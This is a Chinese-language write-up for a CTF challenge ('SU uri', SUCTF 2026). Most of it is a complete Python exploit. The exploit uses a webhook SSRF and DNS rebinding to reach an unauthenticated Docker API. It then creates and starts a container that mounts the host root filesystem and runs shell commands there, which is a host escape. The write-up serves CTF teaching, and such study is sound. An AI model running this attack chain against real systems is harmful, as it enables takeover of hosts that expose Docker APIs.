# suctf 2026 SU uri writeup

## 出题灵感

某次SRC挖掘，发现有一个SSRF到后台docker API未授权接管最后RCE的场景，但是实现是记不得前面如何SSRF了，就想的利用 DNS 重绑定攻击。

## EXP

由于是黑盒，所以测试的话大家测是能慢慢测的，这里我也测试一遍，一般这样的SSRF漏洞需要去探测到内网，主要能探测内网，后面的事情就比较简单了。

那么后面就是打一套docker API 未授权逃逸了，完整利用的EXP如下

```python
#!/usr/bin/env python3
import argparse
import json
import time
import uuid
from typing import Any, Dict, Tuple
import requests

def parse_host_port(value: str) -> Tuple[str, int]:
    if ":" not in value:
        raise argparse.ArgumentTypeError("value must be host:port")
    host, port_raw = value.rsplit(":", 1)
    if not host:
        raise argparse.ArgumentTypeError("host is empty")
    try:
        port = int(port_raw)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("port must be integer") from exc
    return host, port

def unique_rebind_host(root_domain: str) -> str:
    return f"{uuid.uuid4().hex}.{root_domain}"

def send_webhook(target_host: str, target_port: int, url: str, body: str, timeout: int = 20) -> Dict[str, Any]:
    endpoint = f"http://{target_host}:{target_port}/api/webhook"
    payload = {"url": url, "body": body}
    resp = requests.post(endpoint, json=payload, timeout=timeout)

    try:
        data = resp.json()
    except ValueError:
        data = {"message": "non-json webhook response", "target_body": resp.text}

    return {"status_code": resp.status_code, "json": data}

def post_via_rebind(
    target_host: str,
    target_port: int,
    root_domain: str,
    docker_path: str,
    body: str,
) -> Dict[str, Any]:
    host = unique_rebind_host(root_domain)
    rebinding_url = f"http://{host}:2375{docker_path}"
    print(f"[*] webhook -> {rebinding_url}")
    return send_webhook(target_host, target_port, rebinding_url, body)

def main() -> None:
    parser = argparse.ArgumentParser(description="CloudHook DNS-rebinding exploit")
    parser.add_argument("--target", required=True, type=parse_host_port)
    parser.add_argument(
        "--rebind-domain",
        default="rebind.baozongwi.xyz",
    )
    parser.add_argument(
        "--step-delay",
        type=float,
        default=1.7,
    )
    args = parser.parse_args()

    target_host, target_port = args.target

    print("[*] Stage 0: pull alpine:latest image")
    pull_res = post_via_rebind(
        target_host,
        target_port,
        args.rebind_domain,
        "/images/create?fromImage=alpine:latest",
        "{}"
    )
    if pull_res["status_code"] != 200:
        print(f"[-] pull failed ({pull_res['status_code']}): {pull_res['json']}")
    else:
        print("[+] pull command sent, waiting 5 seconds for download...")
        time.sleep(5)

    create_payload = {
        "Image": "alpine:latest",
        "Cmd": ["/bin/sh", "-c", "ln -s /mnt/flag /flag && /mnt/readflag"],
        "HostConfig": {"Binds": ["/:/mnt"]},
    }

    print("[*] Stage 1: create container")
    create_res = post_via_rebind(
        target_host,
        target_port,
        args.rebind_domain,
        "/containers/create",
        json.dumps(create_payload),
    )
    if create_res["status_code"] != 200:
        print(f"[-] webhook error ({create_res['status_code']}): {create_res['json']}")
        return

    create_body = create_res["json"].get("target_body", "")
    try:
        container_id = json.loads(create_body)["Id"]
    except Exception:
        print(f"[-] failed to parse container ID from: {create_body}")
        return
    print(f"[+] container id: {container_id}")

    time.sleep(args.step_delay)

    print("[*] Stage 2: start container")
    start_res = post_via_rebind(
        target_host,
        target_port,
        args.rebind_domain,
        f"/containers/{container_id}/start",
        "{}",
    )
    if start_res["status_code"] != 200:
        print(f"[-] start failed ({start_res['status_code']}): {start_res['json']}")
        return

    time.sleep(args.step_delay)

    print("[*] Stage 3: attach output")
    attach_res = post_via_rebind(
        target_host,
        target_port,
        args.rebind_domain,
        f"/containers/{container_id}/attach?logs=1&stream=0&stdout=1&stderr=1",
        "{}",
    )
    if attach_res["status_code"] != 200:
        print(f"[-] attach failed ({attach_res['status_code']}): {attach_res['json']}")
        return

    print("\n" + "=" * 40)
    print("FLAG OUTPUT:")
    print(attach_res["json"].get("target_body", ""))
    print("=" * 40)

if __name__ == "__main__":
    main()


# python SU_uri/exp/exp.py --target 127.0.0.1:8080 --rebind-domain ttt.rebind.baozongwi.xyz
```



可能一次不成功，需要多运行几次。

![img](https://cdn.nlark.com/yuque/0/2026/png/52634675/1771509391832-d6936e23-c020-4120-805c-2a60014ab67b.png)

